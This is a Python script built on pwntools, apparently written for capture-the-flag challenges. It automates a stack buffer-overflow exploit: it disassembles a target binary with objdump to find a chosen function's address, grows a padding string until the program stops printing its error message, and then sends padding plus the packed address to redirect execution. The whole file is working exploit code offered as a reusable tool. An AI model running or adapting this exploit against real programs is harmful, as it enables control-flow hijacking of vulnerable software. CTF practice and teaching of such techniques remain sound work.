#!/usr/bin/python3
from pwn import *
import subprocess, argparse, sys, getopt, time

description_text = """Script to redirect program execution. Used to call a function that is not mean to be called.
Often required in simple buffer overflow challenges in CTF's."""

example_text = """Examples:\n./overflow_solver_100.py binary_file function_to_call error_msg\n 
./overflow_solver_100.py unwinnable win 'Wrong word'\n """


parser = argparse.ArgumentParser(description=description_text,
                                 epilog=example_text, formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('binary', metavar='binary', type=str, help="binary to execute script on")
parser.add_argument('function', metavar='function', type=str, help='the function to call')
parser.add_argument('error_msg', metavar='error_msg', type=str, help='default binary error message')
args = parser.parse_args()
binary = args.binary
flag = args.function
error = args.error_msg


# Create objdump file from binary
def create_objdump(binary_path):
    f = open(f'objdump_file', 'w')
    subprocess.call(
        ["objdump",
        "-d",
        binary_path
        ], 
        stdout=f)

create_objdump(binary)



# returns the address that should be executed
def get_address():
    exploitAddress = ""
    with open(f"objdump_file", "r") as f:
        lines = f.readlines()
        for line in lines:
            line = line.strip().split('\t')
            line = line[0].split(" ")
            if f"<{flag}>:" in line:
                exploitAddress = "0x" + line[0]
                break

    return exploitAddress


segfault_found = False
count = 1

# while loop that figures out where the program segfaults and then creating the payload
while True:

	p = process(f"{binary}")
	p.recvline()
	if (segfault_found):
		exploitAddress = p64(int(get_address(), 16))
		payload = b"a"*count + exploitAddress
		p.sendline(payload)
		print(p.recvall().decode())
		break
	else:
		payload = b"a"*count
		p.sendline(payload)
		try:
			s = p.recvall()
			# if error message in output -> still not seg fault, continues
			if error.encode() in s:
				count += 1
				continue
			else:
				log.info("Seg fault at %d", count)
				log.info("Preparing payload")
				segfault_found = True
				continue
		except:
			continue
		
